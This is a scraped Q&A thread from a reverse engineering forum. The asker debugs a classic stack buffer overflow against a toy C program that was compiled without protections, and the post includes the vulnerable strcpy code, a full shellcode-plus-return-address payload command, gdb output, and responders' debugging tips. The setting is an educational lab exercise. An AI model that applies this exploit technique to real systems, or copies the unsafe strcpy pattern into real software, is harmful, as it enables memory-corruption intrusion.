{
    "title": "Illegal Instruction on sample Buffer Overflow exploit",
    "link": "https://reverseengineering.stackexchange.com/questions/9298/illegal-instruction-on-sample-buffer-overflow-exploit",
    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I have followed the example <a href=\"https://www.exploit-db.com/papers/24085/\" rel=\"nofollow\">here</a>.</p>\n<p>Here is my sample program, \"oldskool.c\":</p>\n<pre><code>#include &lt;string.h&gt;\nvoid go(char *data) {\n    char name[64];\n\n    strcpy(name, data);\n}\n\nint main (int argc, char **argv) {\n    go(argv[1]);\n}\n</code></pre>\n<p>I have compiled this program using:</p>\n<pre><code>gcc oldskool.c -o oldskool -zexecstack -fno-stack-protector -g\n</code></pre>\n<p>I have also switched ASLR off.</p>\n<p>Using gdb's x/gx $rsp, I verified that passing in an argument of <code>perl -e 'print \"A\"x80'</code> will overwrite the SIP exactly. Here is the output of p &amp;name</p>\n<pre><code>$1 = (char (*)[64]) 0x7fffffffddc0\n</code></pre>\n<p>I then took the example shellcode, and adding the padding and the SIP, came up with this:</p>\n<pre><code>./oldskool `perl -e 'print \"\\xeb\\x22\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xd2\\x48\\xff\\xc0\\x48\\xff\\xc7\\x5e\\x48\\x83\\xc2\\x04\\x0f\\x05\\x48\\x31\\xc0\\x48\\x83\\xc0\\x3c\\x48\\x31\\xff\\x0f\\x05\\xe8\\xd9\\xff\\xff\\xff\\x48\\x61\\x78\\x21\" . \"A\"x27 . \"\\xc0\\xdd\\xff\\xff\\xff\\x7f\"'`\n</code></pre>\n<p>When I run this, however, I get an \"Illegal Instruction\" error. Here's what gdb will tell me:</p>\n<pre><code>Starting program: /path/to/oldskool `perl -e 'print \"\\xeb\\x22\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xd2\\x48\\xff\\xc0\\x48\\xff\\xc7\\x5e\\x48\\x83\\xc2\\x04\\x0f\\x05\\x48\\x31\\xc0\\x48\\x83\\xc0\\x3c\\x48\\x31\\xff\\x0f\\x05\\xe8\\xd9\\xff\\xff\\xff\\x48\\x61\\x78\\x21\" . \"A\"x27 . \"\\xc0\\xdd\\xff\\xff\\xff\\x7f\"'`\n\nProgram received signal SIGILL, Illegal instruction.\n0x00007fffffffddc0 in ?? ()\n\n(gdb) x/10i 0x7fffffffddc0\n=&gt; 0x7fffffffddc0:  (bad)  \n   0x7fffffffddc1:  (bad)  \n   0x7fffffffddc2:  (bad)  \n   0x7fffffffddc3:  incl   (%rax)\n   0x7fffffffddc5:  add    %al,(%rax)\n   0x7fffffffddc7:  add    %ah,-0x1e(%rcx)\n   0x7fffffffddcd:  jg     0x7fffffffddcf\n   0x7fffffffddcf:  add    %ch,%bl\n   0x7fffffffddd1:  and    0x31(%rax),%cl\n   0x7fffffffddd4:  rorb   $0xff,0x31(%rax)\n</code></pre>\n<p>Does anyone have any clue as to what is causing this error? </p>\n</div>",
    "votes": "4",
    "answers": 1,
    "views": "4k",
    "tags": [
        "linux",
        "exploit",
        "shellcode"
    ],
    "user": "Adam Denoon",
    "time": "Jul 6, 2015 at 20:16",
    "comments": [
        {
            "user": "peter ferrie",
            "text": "<span class=\"comment-copy\">It would help to examine the values at the disassembled locations.  That way, you'll know if your shellcode is anywhere nearby.  The solution might then be obvious.</span>",
            "time": null
        },
        {
            "user": "RoraΖ",
            "text": "<span class=\"comment-copy\">Is your shellcode stack aligned?  You might be corrupting your stack.  Is everything the right endianness?  Backwards instructions would be bad.</span>",
            "time": null
        },
        {
            "user": "Adam Denoon",
            "text": "<span class=\"comment-copy\">@peter, Which locations, specifically, would you recommend providing disassembly information for?</span>",
            "time": null
        },
        {
            "user": "Adam Denoon",
            "text": "<span class=\"comment-copy\">@raz, everything is the right endianness, but I'm not sure what you mean by stack-aligned.</span>",
            "time": null
        },
        {
            "user": "RoraΖ",
            "text": "<span class=\"comment-copy\">If your shellcode happens to not land on the 4 byte boundary then you'd be corrupting the stack in a way that would yield an illegal instruction</span>",
            "time": null
        }
    ],
    "answers_data": [
        {
            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>Your shellcode is invalid. Change it to \\x90\\x90\\x90\\x90\\x90\\x90\\xcc to check and detect the correct. <a href=\"https://i.sstatic.net/spY2X.png\" rel=\"nofollow noreferrer\"><img alt=\"enter image description here\" src=\"https://i.sstatic.net/spY2X.png\"/></a></p>\n</div>",
            "votes": "1",
            "user": "Stolas",
            "time": "Sep 18, 2015 at 11:46",
            "is_accepted": false,
            "comments": [
                {
                    "user": "Adam Denoon",
                    "text": "<span class=\"comment-copy\">Are you saying to replace the example shellcode with yours, add padding and address to it, and run it?</span>",
                    "time": null
                },
                {
                    "user": "Stolas",
                    "text": "<span class=\"comment-copy\">Well replace the c0ddffffff7f with 9090909090cc</span>",
                    "time": null
                }
            ]
        }
    ]
}